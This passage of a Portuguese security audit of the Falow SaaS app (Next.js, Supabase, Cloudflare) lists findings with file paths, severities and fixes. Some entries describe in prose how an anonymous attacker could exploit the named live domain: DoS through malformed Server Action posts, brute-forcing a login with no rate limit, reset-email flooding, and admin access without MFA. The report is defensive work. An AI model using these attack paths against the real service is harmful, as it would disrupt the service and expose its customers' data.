| A3-024 | low | optimization | getThread lista sequence_runs ativos com IN (running, waiting_delay, …) sem índice que cubra esses status | `src/modules/crm/inbox/services/inbox.queries.ts:141` | ✅ confirmado parcial (3ª verificação) |
| A1-028 | low | reliability | Operações em lote sem limite e sequenciais: 'Trazer conversas existentes' e aplicar tag em massa | `src/modules/crm/pipeline/server/enroll-lead.ts:61` | ✅ confirmado (3ª verificação) |
| A1-020 | low | bug | Entradas das server actions do funil, notas, status e tags sem validação (sem zod) | `src/modules/crm/pipeline/services/pipeline.actions.ts:44` | ✅ confirmado parcial (3ª verificação) |
| A1-032 | low | reliability | Operações multi-passo do funil e das tags sem transação (estado parcial em falha) | `src/modules/crm/pipeline/services/pipeline.actions.ts:243` | ✅ confirmado (3ª verificação) |
| A2-030 | low | security | Mensagens de erro cruas do Postgres/PostgREST e da Graph API são devolvidas ao navegador por server actions | `src/modules/crm/pipeline/services/pipeline.actions.ts:148` | ✅ confirmado (3ª verificação) |
| A1-026 | low | optimization | getBoard carrega todos os leads do funil para as estatísticas e faz uma query por coluna | `src/modules/crm/pipeline/services/pipeline.queries.ts:112` | ✅ confirmado (3ª verificação) |
| A1-019 | low | bug | Índice fracionário nunca reindexa: needsReindex/MIN_GAP existem mas não são usados | `src/modules/crm/pipeline/utils/fractional-index.ts:32` | ✅ confirmado (3ª verificação) |
| A1-025 | low | optimization | Filtro por tag varre todos os contatos com tag em JS, página a página, sem usar o índice GIN | `src/modules/crm/tags/server/tagged-contacts.ts:31` | ✅ confirmado (3ª verificação) |
| A3-022 | low | optimization | attachTagsToConversations consulta contacts só por ig_sender_id, sem account_id, o que impede o uso do índice único (account_id, ig_sender_id) | `src/modules/crm/tags/services/tags.queries.ts:93` | ✅ confirmado parcial (3ª verificação) |
| A1-040 | low | optimization | Colunas FK sem índice: excluir uma rule/sequence/conversa ou apagar um usuário varre tabelas grandes (interactions, messages, sequence_runs) | `supabase/migrations/0001_init.sql:164` | ✅ confirmado (3ª verificação) |
| A1-043 | low | reliability | processed_events e stripe_events crescem sem limite: nenhuma rotina apaga mids/eventos antigos | `supabase/migrations/0001_init.sql:106` | ✅ confirmado (3ª verificação) |
| A3-025 | low | optimization | processed_events e interactions crescem sem limite: nenhuma retenção/limpeza | `supabase/migrations/0001_init.sql:106` | ✅ confirmado (3ª verificação) |
| A1-022 | low | bug | Trigger crm_on_message_insert decide is_latest fora do UPDATE: corrida entre inserts concorrentes pode deixar last_message_* apontando para a mensagem mais antiga | `supabase/migrations/0009_crm_inbox.sql:120` | ✅ confirmado (3ª verificação) |
| A1-021 | low | security | Policies de escrita para o usuário (rules, sequences, sequence_versions, folders, message_presets, quick_replies, crm_notes, crm_tags, contacts) permitem gravar direto pela API, contornando a validação das server actions, e o banco não tem limites de tamanho | `supabase/migrations/0012_crm_tags.sql:38` | ✅ confirmado (3ª verificação) |
| A1-042 | low | security | access_grants: o usuário bloqueado lê o motivo interno do bloqueio e o UUID do admin que o aplicou | `supabase/migrations/0021_admin_access_grants.sql:23` | ✅ confirmado (3ª verificação) |
| A1-041 | low | security | Policies de leitura expõem ao navegador do usuário as colunas cifradas access_token_enc e api_key_enc | `supabase/migrations/0022_ig_accounts_select_only.sql:20` | ✅ confirmado parcial (3ª verificação) |
| A3-035 | low | config | Observabilidade parcial: traces desligados, logs em string concatenada e identificadores de usuário/conta nos logs | `wrangler.toml:32` | ✅ confirmado parcial (3ª verificação) |
| A2-044 | info | security | GHSA-2vc4-c4r6-p6v6 (bypass de middleware via cache interception) não afeta o Falow: enableCacheInterception está no padrão false | `open-next.config.ts:3` | ✅ confirmado (3ª verificação) |
| A2-043 | info | security | Resumo do npm audit: 34 vulnerabilidades, mas quase todas em dependências de build/dev; o que roda no Worker é next, @opennextjs/cloudflare (template) e zod | `package.json:16` | ✅ confirmado parcial (3ª verificação) |
| A1-045 | info | config | createFolder/savePreset não validam enum e ids em runtime | `src/app/(dashboard)/rules/folders-actions.ts:40` | ✅ confirmado (3ª verificação) |
| A3-039 | info | bug | Presets: scope não é validado no servidor e a listagem mistura todas as contas do usuário | `src/app/(dashboard)/rules/presets-actions.ts:45` | ✅ confirmado parcial (3ª verificação) |
| A0-047 | info | optimization | Registro de ações limitado às últimas 50 entradas, sem paginação nem filtro por cliente/admin | `src/app/admin/page.tsx:52` | ✅ confirmado (3ª verificação) |
| A0-043 | info | webhook | Assinatura calculada sobre o corpo re-codificado (text) em vez dos bytes brutos | `src/app/api/webhooks/meta/route.ts:29` | ✅ confirmado parcial (3ª verificação) |
| A2-041 | info | security | Comparação de META_VERIFY_TOKEN e CRON_SECRET com === (não timing-safe) | `src/app/api/webhooks/meta/route.ts:19` | ✅ confirmado (3ª verificação) |
| A0-045 | info | security | setPassword troca a senha de qualquer sessão logada sem senha atual nem reautenticação | `src/app/definir-senha/actions.ts:69` | ✅ confirmado parcial (3ª verificação) |
| A0-046 | info | optimization | revokeCourtesy e unblockUser leem access_grants duas vezes por chamada | `src/lib/admin/grants.ts:121` | ✅ confirmado (3ª verificação) |
| A3-041 | info | security | Injeção de prompt no botão ✨ fica restrita ao próprio usuário (sem risco entre tenants) | `src/lib/ai/prompt.ts:56` | ✅ confirmado (3ª verificação) |
| A0-044 | info | optimization | Purge relê access_grants e subscriptions duas vezes por usuário (trabalho repetido) | `src/lib/billing/purge.ts:55` | ✅ confirmado (3ª verificação) |
| A0-042 | info | webhook | Token de acesso do Instagram vai na query string de toda chamada à Graph API | `src/lib/meta/graph.ts:48` | ✅ confirmado (3ª verificação) |
| A3-042 | info | security | Tokens de acesso e client_secret trafegam na query string das chamadas à Graph API | `src/lib/meta/graph.ts:48` | ✅ confirmado (3ª verificação) |
| A3-038 | info | optimization | processPostbackEvent chama getFreshToken duas vezes (possível renovação dupla do token) e humanPause faz uma chamada Graph extra por mensagem | `src/lib/meta/process.ts:696` | ✅ confirmado (3ª verificação) |
| A2-042 | info | config | Logs do Worker guardam @ de clientes, ids de leads e mensagens de erro da Meta (PII sob LGPD) | `src/lib/meta/served-account.ts:22` | ✅ confirmado parcial (3ª verificação) |
| A0-041 | info | webhook | Dois App Secrets aceitos na validação da assinatura dobram a superfície de forja | `src/lib/meta/verify.ts:18` | ✅ confirmado parcial (3ª verificação) |
| A2-045 | info | security | CVE-2025-29927 (bypass de middleware via x-middleware-subrequest) está corrigido: Next 14.2.35 >= 14.2.25 e o OpenNext executa o middleware incondicionalmente | `src/middleware.ts:9` | ✅ confirmado (3ª verificação) |
| A3-040 | info | config | Modelo de IA do usuário sem limite de tamanho | `src/modules/ai-settings/actions.ts:45` | ✅ confirmado (3ª verificação) |
| A1-046 | info | optimization | Policies usam auth.uid() sem (select auth.uid()): reavaliação por linha (lint auth_rls_initplan do Supabase) | `supabase/migrations/0001_init.sql:196` | ✅ confirmado parcial (3ª verificação) |
| A3-043 | info | config | Env e ExecutionContext escritos à mão no worker.ts, fora do typecheck, e wrangler.toml em vez de wrangler.jsonc | `worker.ts:15` | ✅ confirmado (3ª verificação) |

## Segunda verificação (29/10)

20 achados graves e únicos foram verificados por um agente cada. Resultado: 19 confirmados (alguns parcialmente) e 1 incerto (A2-006, depende do que os logs da Cloudflare gravam). Nenhum foi refutado.

Duplicatas de achados já confirmados, sem verificação própria: A1-001 e A2-001 (= A0-001, Next.js); A1-002, A2-003 e A3-009 (= A0-005, headers); A1-004 e A3-004 (= A0-015, CRM sem checar acesso); A2-002 e A3-008 (= A0-012, webhook lento); A2-005 e A3-007 (= A0-031, CRON_SECRET na URL); A2-008 (= A0-003, OpenNext); A2-009 (= A0-030, limite de 26 MB); A3-005 (= A0-025, URL sem /sistema); A2-011 a A2-016 e A3-011 (= A0-017, consultas em excesso no webhook); A2-018 (= A0-014, Graph API a cada render).

Sem verificação: A3-010 (proteções de borda, depende do painel da Cloudflare) e os achados de severidade baixa ou informativa.

## Terceira verificação e novos achados (29/10)

Os 104 achados restantes de severidade baixa e informativa foram verificados. Todos se confirmaram, 34 só em parte (impacto menor do que o descrito ou parte não comprovada). Nenhum foi refutado. A2-044 e A2-045 confirmam que o app não está exposto ao bypass de middleware do Next (CVE-2025-29927) nem à interceptação de cache do OpenNext.

Duas buscas extras cobriram o que a primeira rodada leu pela metade: execução dos nós das sequências, login, OAuth, criptografia e IA. Novos achados confirmados no código:

| ID | Sev. | Título | Arquivo |
|---|---|---|---|
| N-01 | média | Troca de senha em /definir-senha só com sessão, sem senha atual e sem derrubar as outras sessões | `src/app/definir-senha/actions.ts:70` |
| N-02 | média | Run em waiting_reply/waiting_postback nunca expira e captura mensagens de semanas depois, passando na frente das regras | `src/lib/sequences/runtime.ts:413` |
| N-03 | média | Toque repetido ou obsoleto em resposta rápida cai nas regras de palavra-chave e pode disparar outro fluxo | `src/lib/sequences/runtime.ts:399` |
| N-04 | média | Atualização perdida no contato: o fluxo grava fields e tags inteiros a partir de um retrato de até 40 s antes | `src/lib/sequences/flow-data.ts:122` |
| N-05 | média | Template que vira texto vazio (variável não coletada) faz a Meta recusar e trava a pessoa no fluxo | `src/lib/sequences/runtime.ts:932` |
| N-06 | média | saveSequence sem controle de concorrência e permite trocar a conta de uma sequência com runs em andamento | `src/app/(dashboard)/rules/sequencias/actions.ts:336` |
| N-07 | baixa | Policy de user_ai_settings permite gravar chave, modelo e provedor direto pela API, pulando as validações | `supabase/migrations/0016_user_ai_settings.sql:27` |
| N-08 | baixa | Coletar dado numérico corrompe números grandes (vira 1e+22) | `src/lib/sequences/collect.ts:92` |
| N-09 | baixa | Validação de telefone aceita qualquer frase com 10 a 15 dígitos somados (CEP, CPF) | `src/lib/sequences/collect.ts:45` |
| N-10 | baixa | Reativar sequência não revalida o grafo; regra ou etapa apagada gera erro para cada pessoa | `src/app/(dashboard)/rules/sequencias/actions.ts:401` |
| N-11 | baixa | Teto de 1000 passos encerra menus cíclicos legítimos; "Já segui" consulta a Graph API sem limite | `src/lib/sequences/runtime.ts:105` |
| N-12 | baixa | Upload confia no tipo de arquivo declarado pelo navegador, sem conferir o conteúdo | `src/modules/crm/inbox/utils/attachment-types.ts:30` |

Verificado sem problema nessas áreas: ciclos no grafo, limites de tamanho do grafo, referências entre tenants, injeção em template, chave de IA nunca vai ao navegador, sem SSRF nos provedores de IA, state do OAuth, mensagens de login sem enumeração de contas, exportação CSV protegida contra fórmulas, nenhum dangerouslySetInnerHTML.

## Detalhes

### A0-001 [high] Next.js 14.2.35 está fora da linha de correções de segurança: 25 advisories abertos no npm audit, todos corrigidos só em 15.5.x/16.x
`package.json:37` · security · ✅ confirmado (3 lentes)

**O que é:** O lock instala next 14.2.35 (node_modules/next/package.json). `npm audit` lista 25 advisories cujo intervalo vulnerável inclui a linha 14.x inteira e cuja primeira versão corrigida é 15.5.10 a 15.5.28 (ex.: GHSA-m99w-x7hq-7vfj e GHSA-p3m5-59mp-jv5r, DoS em App Router via Server Actions, high; GHSA-h25m-26qc-wcjf, GHSA-q4gf-8mx6-v5v3 e GHSA-8h8q-6873-q5fj, DoS em Server Components, high; GHSA-955p-x3mx-jcvp, exposição não autenticada de endpoints de Server Functions; GHSA-3g8h-86w9-wvmq, cache poisoning de redirects do middleware; GHSA-wfc6-r584-vfw7 e GHSA-vfv6-92ff-j949, cache poisoning de respostas RSC). A Vercel não publica mais correções na linha 14.2, então ficar em ^14.2.5 significa carregar esses problemas sem patch. Alguns itens da lista não se aplicam a este deploy (RCE no otimizador de imagem via sharp e DoS por remotePatterns, porque o OpenNext atende /_next/image com handleImageRequest próprio; RCE em Windows; bypass de i18n no Pages Router; SSRF em rewrites, não há rewrites configurados), mas os DoS por Server Actions/RSC e a divulgação de endpoints são genéricos e valem aqui. CVE-2025-29927 (x-middleware-subrequest) está coberto: a string nem existe mais no dist do 14.2.35 e o OpenNext executa o middleware por conta própria (handleMiddleware), sem olhar esse header.

**Como acontece:** Atacante anônimo envia POSTs de server action/RSC malformados (ex.: payload de action com referências cíclicas ou cabeçalhos RSC inválidos, conforme GHSA-m99w-x7hq-7vfj / GHSA-h25m-26qc-wcjf) para qualquer rota do app, inclusive /sistema/login, e esgota CPU/memória do Worker (limite de 128 MB), derrubando o painel e os webhooks que rodam no mesmo Worker; o bodySizeLimit de 26 MB (next.config.mjs:9) amplia o custo por requisição.

**Evidência:** package.json:37 `"next": "^14.2.5"`; node_modules/next/package.json version 14.2.35; `npm audit --json` → next: 25 advisories, fixAvailable next@16.4.3 (semver major); intervalos como `>=13.0.0 <15.5.21` e `>=13.0.0 <=15.5.27` incluem 14.2.35.

**Recomendação:** Planejar a migração para Next 15.5.x (versão ≥ 15.5.28, a mais recente com todos os patches) ou 16.x, junto com React 19 e @opennextjs/cloudflare ≥ 1.20.2 (ver achado específico). Enquanto isso, na Cloudflare: regra de WAF/rate limiting para POST em /sistema/* (ver achado de rate limit) e Bot Fight Mode, para reduzir o alcance dos DoS não autenticados. Recorrer a `npm audit` no CI para que o próximo advisory não passe despercebido.

**Verificação:** refute: confirmed (high) / exploit: confirmed (high) / impact: confirmed (medium)

### A1-001 [high] Next.js 14.2.35 fora da linha com correções de segurança (DoS em Server Actions, cache confusion, disclosure de endpoints)
`package.json:37` · security · ⚠️ não verificado

**O que é:** O app roda Next 14.2.35 (dependência "next": "^14.2.5"). O `npm audit --omit=dev` lista 26 advisories abertos para essa versão, e os patches de quase todos só existem na linha 15.5.x ou 16.x, ou seja, a linha 14 não recebe mais correção. Os que se aplicam a este app (App Router + Server Actions + middleware, hospedado em Worker): GHSA-m99w-x7hq-7vfj e GHSA-p3m5-59mp-jv5r (DoS em App Router via Server Actions), GHSA-4c39-4ccg-62r3 (payload de Server Action sem limite no runtime edge), GHSA-68g3-v927-f742 / GHSA-4633-3j49-mh5q (confusão de cache de respostas com corpo), GHSA-955p-x3mx-jcvp (descoberta não autenticada dos endpoints internos de Server Functions), GHSA-h25m-26qc-wcjf / GHSA-q4gf-8mx6-v5v3 / GHSA-8h8q-6873-q5fj (DoS via deserialização de RSC), GHSA-3g8h-86w9-wvmq (cache poisoning de redirects do middleware). Os RCEs do Image Optimizer (AVIF/SVG) NÃO se aplicam: no Cloudflare o /_next/image é atendido pelo template do OpenNext, não pelo otimizador do Next.

**Como acontece:** Atacante anônimo envia POSTs forjados de Server Action (payloads RSC malformados ou enormes) para falow.app.br/sistema; o Worker gasta CPU/memória até o limite da invocação. Como webhook da Meta, cron das sequências e painel rodam no mesmo Worker, o bot para de responder DMs enquanto o ataque dura. O serverActions.bodySizeLimit de 26mb (next.config.mjs:9) amplia o custo por requisição.

**Evidência:** npm audit: next 9.3.4-canary.0 - 16.3.0-preview.10 (critical); ex.: GHSA-m99w-x7hq-7vfj >=13.0.0 <15.5.21; GHSA-955p-x3mx-jcvp >=13.0.0 <15.5.21; instalado: next 14.2.35

**Recomendação:** Planejar a migração para uma linha com suporte (15.5.x mais recente ou 16.x) junto com a versão correspondente do @opennextjs/cloudflare, e rodar `npm audit --omit=dev` no CI. Enquanto isso, mitigar no edge: Cloudflare WAF/Rate Limiting por IP nas rotas do painel e limite de tamanho de corpo (Transform/WAF) para o que não é upload do composer.

### A2-001 [high] Next.js 14.2.35 em fim de vida: advisories de 2026 (DoS não autenticado via Server Functions/RSC, exposição de IDs de Server Actions) não têm correção no branch 14
`package.json:37` · security · ⚠️ não verificado

**O que é:** O projeto fixa `next: ^14.2.5` (resolvido para 14.2.35). O registry npm mostra que 14.2.35 (2025-12-11) é o último release do branch 14 (dist-tag `next-14`), enquanto o branch 15 continua recebendo backports (`backport: 15.5.28`). `npm audit --omit=dev` aponta 1 crítico, 4 altos e 1 moderado; das 25 advisories listadas para `next`, as que afetam o Falow de fato e NÃO têm patch em 14.x são: GHSA-h25m-26qc-wcjf, GHSA-q4gf-8mx6-v5v3 e GHSA-8h8q-6873-q5fj (deserialização de payload RSC em qualquer endpoint de Server Function -> CPU/OOM; a advisory cita explicitamente 'Next.js 13.x, 14.x, 15.x e 16.x usando App Router'), GHSA-m99w-x7hq-7vfj e GHSA-p3m5-59mp-jv5r (DoS em apps App Router com pelo menos uma Server Action; 'sem workaround além de upgrade'), GHSA-955p-x3mx-jcvp (IDs de Server Actions expostos nos chunks públicos; recon) e GHSA-4c39-4ccg-62r3 (payload de Server Action sem limite). O Falow usa App Router e Server Actions em páginas públicas (`src/app/login/actions.ts`, `src/app/definir-senha/actions.ts`; `/definir-senha` está em PUBLIC_PATHS em `src/lib/auth/routing.ts:7-14` e `/login` passa pelo middleware sem sessão), então o vetor é alcançável sem login, e `serverActions.bodySizeLimit: "26mb"` (next.config.mjs:9) amplia o vetor. As demais advisories de `next` (RCE/DoS no Image Optimizer via SVG/AVIF, remotePatterns, cache em disco, rewrites, i18n/Pages Router, RCE em Windows, SSRF via WebSocket upgrade, XSS com CSP nonce/beforeInteractive, cache poisoning de RSC) dependem de recursos que o Falow não usa ou que o OpenNext substitui: `/sistema/_next/image` é atendido pelo template `images.js` do @opennextjs/cloudflare (valida `remotePatterns`, bloqueia SVG, não usa sharp), não há `rewrites`, `i18n`, `nonce`, `beforeInteractive` nem `runtime = 'edge'` no código, e GHSA-89xv-2m56-2m9x (SSRF em redirect de Server Action via Host) é mitigada porque o OpenNext fixa `process.env.__NEXT_PRIVATE_ORIGIN = url.origin` (`init.js:117`) e `action-handler.js:185` usa essa variável antes do header `host`. Um dos agentes classificou como crítico; a mesclagem mantém alto porque o impacto comprovado é de disponibilidade e custo (DoS sem patch), não execução remota ou exposição de dados.

**Como acontece:** Atacante anônimo envia POST com header `Next-Action` e corpo RSC malformado (até 26 MB) para https://falow.app.br/sistema/login ou /sistema/definir-senha (ou qualquer rota do painel que aceite POST com `Next-Action`). O middleware deixa passar (página pública), o Next 14 deserializa o payload e consome CPU/memória até o Worker ser abortado pelo limite de CPU/128 MB. Repetido em volume, derruba o painel, os webhooks da Meta/Stripe (mesmo Worker) e gera custo de invocações. Não existe versão 14.x com correção.

**Evidência:** package.json:37 `"next": "^14.2.5"`; node_modules/next/package.json = 14.2.35; `npm view next time`: 14.2.35 em 2025-12-11 é o último 14.x; `npm audit --omit=dev --json` -> {critical:1, high:4, moderate:1}; OSV para GHSA-h25m/q4gf/8h8q: 'including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router', ranges `>=13.0.0 <15.0.8` / `<15.5.15` / `<15.5.16` sem branch 14 corrigido; GHSA-m99w/p3m5: 'No workaround exists besides upgrading'; next.config.mjs:9 `serverActions: { bodySizeLimit: "26mb" }`.

**Recomendação:** Planejar a migração para Next 15.5.x (dist-tag `backport`, hoje 15.5.28) ou 16.4.x junto com `@opennextjs/cloudflare` >= 1.20.x (que suporta 15/16), atualizando zod/postcss/nanoid/qs no mesmo passo (`npm audit fix`, com cuidado com breaking changes). Até lá, reduzir a superfície via Cloudflare: regra de WAF/Rate Limiting para POST em /sistema/login, /sistema/definir-senha e /sistema/* em geral (ex.: 60 req/min por IP, limite de tamanho de corpo fora da rota de upload), reduzir `bodySizeLimit` global e mover o upload de anexo para uma rota dedicada; monitorar erros 'exceeded CPU' nos Workers Logs; rodar `npm audit` no CI. Não há correção possível apenas trocando o patch do 14.x.

### A2-002 [high] Webhook da Meta responde 200 só depois de todo o processamento (sleeps de 2–5s por regra, pausas humanizadas e atrasos inline de até 20s)
`src/app/api/webhooks/meta/route.ts:45` · optimization · ⚠️ não verificado

**O que é:** O POST do webhook faz `await processWebhookPayload(payload)` antes de devolver 200. Dentro dele, cada regra dorme `clampDelay` (2–5s) em process.ts:470/730/953, cada nó de envio de workflow faz `humanPause` (typing_on + 2–3,5s, runtime.ts:1316-1323) e nós de atraso até 20s dormem inline (runtime.ts:1003-1004). Um payload com 1 DM que casa regra + workflow de 4 mensagens segura a resposta por ~5s + 4×(~0,3s typing + ~2,75s + ~0,4s send) ≈ 19s; o orçamento vai até 40s (INVOCATION_BUDGET_MS). A Meta reentrega eventos cujo endpoint não responde a tempo (prazo exato a confirmar na documentação/configuração do app), gerando tráfego duplicado que só é barrado no insert em processed_events depois de nova verificação de assinatura. Além disso `maxDuration = 60` é uma diretiva da Vercel, ignorada pelo Worker da Cloudflare.

**Como acontece:** Meta entrega 1 entry com 3 DMs de pessoas diferentes que casam regra com delay 5s → o laço sequencial (process.ts:167-168) soma ≥15s antes do 200; a Meta pode considerar timeout e reenviar o mesmo lote; cada reenvio repete verificação HMAC + JSON parse + 1 insert em processed_events por evento.

**Evidência:** route.ts:44-52: `try { await processWebhookPayload(payload); } catch ... return NextResponse.json({ received: true });` e process.ts:470 `await sleep(clampDelay(rule.delay_seconds) * 1000);`

**Recomendação:** Responder 200 imediatamente após validar a assinatura e enfileirar o processamento com `ctx.waitUntil` (via `getCloudflareContext()` do @opennextjs/cloudflare) ou com Cloudflare Queues; alternativamente persistir o payload e processá-lo pelo cron. Manter o dedupe em processed_events antes de enfileirar.

### A0-009 [medium] Cliente bloqueado consegue pagar pela landing e continua sem acesso
`src/app/api/billing/checkout/route.ts:33` · bug · ✅ confirmado (3 lentes)

**O que é:** checkoutDecision só olha admin e status da assinatura; a rota não consulta access_grants. A página /assinatura esconde 'Reativar' para bloqueado, mas a landing (src/app/page.tsx linha 31) mostra 'Assinar o Falow' para qualquer visitante, inclusive logado e bloqueado. O bloqueado paga, o webhook grava status active, e hasActiveAccess continua negando (bloqueio vence assinatura). Resultado: cobrança de alguém que não vai receber o serviço, com reembolso manual.

**Como acontece:** Usuário com access_grants.kind='block' e sem assinatura ativa abre /sistema (landing) logado → POST /api/billing/checkout → Checkout é criado com customer_email → paga → subscriptions.status=active, mas middleware/bot seguem negando por causa do bloqueio.

**Evidência:** const decision = checkoutDecision({ userId: user?.id ?? null, owner: isAdmin(user?.id), subscription }); if (decision.kind === "dashboard") return ...; const session = await getStripe().checkout.sessions.create({...})

**Recomendação:** Na rota de checkout, ler access_grants do usuário logado (accessGrantOf) e, se kind='block', redirecionar para /assinatura sem abrir o Checkout. Opcionalmente esconder o botão da landing para usuário bloqueado.

**Verificação:** refute: confirmed (low) / exploit: confirmed (medium) / impact: confirmed (medium)

### A0-012 [medium] Tempo de execução do webhook: sleeps, delays inline e tick oportunista rodam dentro do request antes do 200
`src/app/api/webhooks/meta/route.ts:45` · webhook · ✅ confirmado (3 lentes)

**O que é:** A resposta à Meta só sai depois de processar sequencialmente todos os `entry`/`messaging` do lote, e cada um pode incluir: pausa humanizada de 2-5s por regra (l.470, l.730, l.953), recheck do portão com +3s (follow-gate/check.ts l.32), delays de sequência inline até 20s (runtime.ts l.89, l.1003), chamadas à Graph API com timeout de 15s cada, e ainda `expireAutomationsSafe()` + `processDueRunsSafe(3, ...)` ao final (l.186-187), que executam `recoverStaleRuns` + consulta de runs vencidos e podem retomar até 3 sequências de OUTRAS contas dentro do request. O `export const maxDuration = 60` (route.ts l.11) é uma convenção da Vercel sem efeito no Cloudflare Worker. A Meta reenvia a notificação quando não recebe 200 em tempo (prazo exato a confirmar na doc): o reenvio é deduplicado por `mid`, mas eventos sem `mid` (referral puro, l.230-233) são reprocessados, e cada reenvio ocupa mais uma invocação concorrente.

**Como acontece:** Lote com 3 mensagens de 3 leads casando regras de 5s + 1 lead com portão de seguidor (recheck 3s) + tick oportunista retomando 3 runs com delay inline: o request passa de 30-40s antes do 200. A Meta considera falha e reenvia; cada reenvio refaz as consultas (dedupe) e, no caso de referral sem `mid`, pode iniciar o fluxo de novo (bloqueado só pelo unique de `sequence_runs`).

**Evidência:** process.ts l.163-180 laço sequencial por entry/evento; l.186-187 `await expireAutomationsSafe(); await processDueRunsSafe(3, ...)` após o laço; route.ts l.45 `await processWebhookPayload(payload)` antes de responder; runtime.ts l.91 `INVOCATION_BUDGET_MS = 40 * 1000` (orçamento pensado para um limite de 60s que não existe no Worker).

**Recomendação:** Responder 200 logo após validar assinatura e JSON, e processar em `ctx.waitUntil` (OpenNext expõe o contexto do Cloudflare) ou numa Cloudflare Queue/Durable Object; mover o tick oportunista para só o cron (já roda a cada minuto); remover `maxDuration` ou documentar que não se aplica ao Worker e dimensionar `INVOCATION_BUDGET_MS` pelo limite real do Worker.

**Verificação:** refute: confirmed (medium) / exploit: confirmed (medium) / impact: confirmed (medium)

### A0-004 [medium] Login, 'esqueci minha senha' e 'definir senha' sem rate limit no app; o Supabase só vê o IP de saída da Cloudflare
`src/app/login/actions.ts:28` · security · ✅ confirmado (3 lentes)

**O que é:** signIn (signInWithPassword), requestPasswordReset (resetPasswordForEmail) e setPassword (verifyOtp/updateUser) são server actions sem nenhum controle de tentativas, captcha ou atraso. Como a chamada ao Supabase Auth sai do Worker, o IP que o Supabase enxerga é o egress da Cloudflare, compartilhado por todos os usuários; os limites por IP do Supabase (a confirmar na configuração do projeto) não distinguem o atacante dos clientes e podem até bloquear o login de todo mundo quando alguém força senha. A mensagem de erro é genérica (bom), mas isso não impede força bruta de senhas de 6 caracteres (mínimo aceito em credentialsSchema) nem o disparo massivo de e-mails de recuperação para qualquer endereço via requestPasswordReset.

**Como acontece:** Atacante anônimo faz milhares de POST da action signIn em /sistema/login com listas de senhas para um e-mail conhecido (ex.: o do dono, que aparece no rodapé da landing como contato) até acertar; ou dispara requestPasswordReset em laço para esgotar a cota de e-mail do Supabase/Resend e impedir recuperação legítima.

**Evidência:** src/app/login/actions.ts:28 `await supabase.auth.signInWithPassword(parsed.data)` e :42 `resetPasswordForEmail(...)` sem qualquer contagem; src/app/login/actions.ts:10 `password: z.string().min(6, ...)`; nenhuma ocorrência de rate limit / cf-connecting-ip em src.

**Recomendação:** Na Cloudflare, criar regras de Rate Limiting para `POST falow.app.br/sistema/login*` e `POST falow.app.br/sistema/definir-senha*` (por IP e, se possível, por corpo/e-mail), e ligar Bot Fight Mode / Turnstile no formulário de login. No Supabase, conferir Auth → Rate Limits e ativar proteção contra senhas vazadas (HaveIBeenPwned) e mínimo de senha coerente com os 8 caracteres do definir-senha. Opcionalmente, um contador por e-mail/IP em Durable Object ou KV dentro da action.

**Verificação:** refute: confirmed (medium) / exploit: confirmed (medium) / impact: confirmed (medium)

### A0-007 [medium] requireAdmin aceita sessão sem MFA (AAL1): senha vazada de um admin dá o painel inteiro
`src/lib/admin/require-admin.ts:18` · security · ✅ confirmado (3 lentes)

**O que é:** requireAdmin só confere `getUser()` + lista de UUIDs. O runbook (docs/operacao-saas.md, seção 'MFA nas contas admin') diz explicitamente que MFA 'não é trava no código'. Nenhum lugar do código consulta `auth.mfa.getAuthenticatorAssuranceLevel()` ou o claim `aal` do JWT (grep por mfa/aal2 não retorna nada em src/). Mesmo que o admin tenha TOTP cadastrado no Supabase, uma sessão aberta só com senha (aal1) passa por requireAdmin, pelo middleware (isAdmin) e por todas as actions.

**Como acontece:** Phishing ou credential stuffing da senha de um admin (ou do dono) → login em /login com senha → sessão aal1 → /admin lista e-mails, último login, @ conectado e status de assinatura de todos os clientes; o atacante bloqueia clientes, dá cortesia sem prazo para contas próprias e dispara convites/recuperação de senha. Se o MFA não estiver habilitado no projeto Supabase (a confirmar na configuração), a senha é o único fator.

**Evidência:** require-admin.ts:14-19: `const { data: { user } } = await createClient().auth.getUser(); if (!user || !isAdmin(user.id)) throw new AdminRequiredError();` — nenhuma checagem de AAL. docs/operacao-saas.md:979: 'Não é trava no código; é recomendação do runbook.'

**Recomendação:** Em requireAdmin (e no ramo isAdminPath do middleware) exigir `(await supabase.auth.mfa.getAuthenticatorAssuranceLevel()).currentLevel === 'aal2'` quando o usuário tiver fator cadastrado, e recusar admins sem fator cadastrado (ou pelo menos registrar aviso). Habilitar TOTP no painel Supabase (a confirmar) e, se possível, adicionar Cloudflare Access/Zero Trust na rota falow.app.br/sistema/admin* como segunda camada.

**Verificação:** refute: confirmed (medium) / exploit: confirmed (medium) / impact: confirmed (medium)

### A0-010 [medium] Corrida entre entregas paralelas: a mesma regra pode responder 2x para a mesma pessoa
`src/lib/meta/process.ts:455` · bug · ✅ confirmado (3 lentes)

**O que é:** A anti-duplicidade de `applyRule` é leitura-depois-escrita: consulta `rule_triggers` (l.455-462), dorme 2-5s (l.470), chama a Graph API (l.496) e só então grava o `rule_triggers` com `ignoreDuplicates` (l.509-512). O `ignoreDuplicates` só evita erro no upsert; não impede que duas invocações concorrentes passem pela leitura antes de qualquer uma gravar. A Meta entrega webhooks em paralelo e cada mensagem tem `mid` próprio, então o dedupe por `processed_events` não cobre esse caso. O mesmo padrão existe em `applyCommentRule` (l.936-942 leitura, l.1003-1006 gravação) para dois comentários da mesma pessoa.

**Como acontece:** Lead manda "preço" duas vezes em sequência rápida (ou comenta duas vezes com a palavra-chave). A Meta entrega os dois eventos em invocações paralelas; ambas leem `rule_triggers` vazio, ambas dormem 2-5s, ambas enviam a resposta. Resultado: lead recebe o link/conteúdo em dobro, e com portão de seguidor, dois portões.

**Evidência:** l.455-462: select rule_triggers → `if (trigger && !heldByGate) return duplicate_skip`; l.470: `await sleep(clampDelay(...))`; l.496: `await sendRuleReply(...)`; l.509: upsert rule_triggers com `ignoreDuplicates: true` só depois do envio.

**Recomendação:** Reservar o disparo ANTES do envio com uma escrita atômica (ex.: insert em `rule_triggers` com `ignoreDuplicates` e checar se a linha foi criada por esta invocação, ou um UPDATE condicional como já faz `lockDelivery`), e liberar a reserva se o envio falhar, como já é feito com `releaseDelivery`.

**Verificação:** refute: confirmed (medium) / exploit: confirmed (medium) / impact: confirmed (medium)

### A0-011 [medium] Dedupe gravado antes do processamento + 200 incondicional: falha transitória perde o evento para sempre
`src/lib/meta/process.ts:235` · reliability · ✅ confirmado (3 lentes)

